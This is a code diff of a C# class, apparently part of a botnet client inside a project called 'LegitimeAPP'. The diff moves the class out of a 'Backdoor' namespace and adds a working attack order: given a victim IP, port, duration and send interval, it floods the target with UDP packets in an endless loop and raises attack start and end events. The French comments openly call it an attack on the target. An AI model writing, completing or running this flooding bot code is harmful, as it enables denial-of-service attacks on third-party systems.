@@ -1,11 +1,13 @@
-using System ;
-using System.Collections.Generic ;
-using System.Net ;
-using System.Net.Sockets ;
-using System.Net.NetworkInformation;
-
+using System;
+using System.Collections.Generic;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
 using System.Xml;
 using System.Xml.Serialization;
+
+using LegitimeAPP.Shared;
+using LegitimeAPP.Network;
 
 
 /*
@@ -14,59 +16,150 @@ CLIENTSIDE ORDER CLASS
 
 */
 
-namespace LegitimeAPP.Backdoor {
-    public class Order {
+namespace LegitimeAPP.Shared
+{
+    public class Order
+    {
 
 
         [XmlElement("port")]
-        public int Port {get; set;}
-
+        public int Port;
         [XmlElement("victimIP")]
-        public string VictimIP {get; set;}
-
+        public string VictimIP;
         [XmlElement("nbSecond")]
-        public int nbSecond ;
+        public int nbSecond;
 
-
-/*
-        [XmlElement("Speed")]
-        public int speed ; 
-*/
         [XmlIgnore]
-        Thread executingThis ; 
-        public Order() {}
+        public int speed;
 
-        public Order(int Port, string VictimIP, int nbSecond) {
-            this.Port = Port ;
-            this.VictimIP = VictimIP ;
-            this.nbSecond = nbSecond ;
-           // this.speed = speed ; 
+        [XmlIgnore]
+        Thread executingThis;
+
+        [XmlIgnore]
+        private static System.Timers.Timer Timer;
 
 
-            executingThis = new Thread(Exec) ;
+        // Evenement 
 
-            executingThis.Name = "Executing Order" ;
+        public event EventConnectionHandler NewAttackOrder;
+        public event EventConnectionHandler EndAttackOrder;
 
-            executingThis.Start() ;    
+
+        public void OnNewAttackOrder() => NewAttackOrder?.Invoke();
+        public void OnEndAttackOrder() => EndAttackOrder?.Invoke();
+
+
+        public Order() { }
+
+        public Order(int Port, string VictimIP, int nbSecond, int speed = 250)
+        {
+            this.Port = Port;
+            this.VictimIP = VictimIP;
+            this.nbSecond = nbSecond;
+            this.speed = speed;
+
+
+        }
+
+        // DEMARRE L'ATTAQUE
+
+        public void Start()
+        {
+
+           
+                // Initialise le Thread 
+                executingThis = new Thread(Exec);
+                executingThis.Name = "Executing Order";
+                
+
+                OnNewAttackOrder();
+
+
+                
+
+
+            Timer = new System.Timers.Timer(nbSecond * 1000)
+            {
+                AutoReset = false,
+                Enabled = true, 
+            };
+
+            Console.WriteLine("The application started at {0:HH:mm:ss.fff}", DateTime.Now);
+
+
+            Timer.Elapsed += delegate
+                {
+
+                    if (executingThis != null && executingThis.IsAlive)
+                    {
+
+                        Console.WriteLine("The Elapsed event was raised at {0:HH:mm:ss.fff}",
+                          DateTime.Now);
+                        OnEndAttackOrder();
+                        Timer.Dispose() ; 
+                        executingThis = new Thread(Exec);
+                    }
+                };
+
+                // Démarrage du timer et de l'attaque
+                Timer.Start();
+                executingThis.Start();
+           
         }
 
 
+
         // ARRÊTE L'ATTAQUE EN COURS 
-        private void Stop() {
+        private void Stop()
+        {
 
         }
 
         // PERMET DE CHANGER DE CIBLE 
-        private void Change() {
+        public void Change(int Port, string VictimIP, int nbSecond, int speed = 250)
+        {
+
+            this.Port = Port;
+            this.VictimIP = VictimIP;
+            this.nbSecond = nbSecond;
+            this.speed = speed;
+        }
+
+
+
+        public void Change(Order order)
+        {
+
+            
+            Port = order.Port;
+            VictimIP = order.VictimIP;
+            nbSecond = order.nbSecond;
 
         }
 
-        // EXECUTION DE L'ORDRE
-        private void Exec() {
-            // On execute l'ordre ici
-        
-            
-      
+
+        /* 
+        PERMET D'ATTAQUER LA CIBLE
+        entre-autre lui envoyer plein de data inutile
+        */
+        private void Exec()
+        {
+            byte[] data = ASCIIEncoding.ASCII.GetBytes("0123456789");
+
+            Socket target = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+            IPEndPoint ep = new(IPAddress.Parse(this.VictimIP), this.Port);
+
+
+            while (true)
+            {
+
+                // Console.WriteLine("On attaque ! ") ; 
+
+                target.SendTo(data, ep);
+
+                // attente avant chaque envoie 
+                Thread.Sleep(this.speed);
+            }
         }
     }
 }
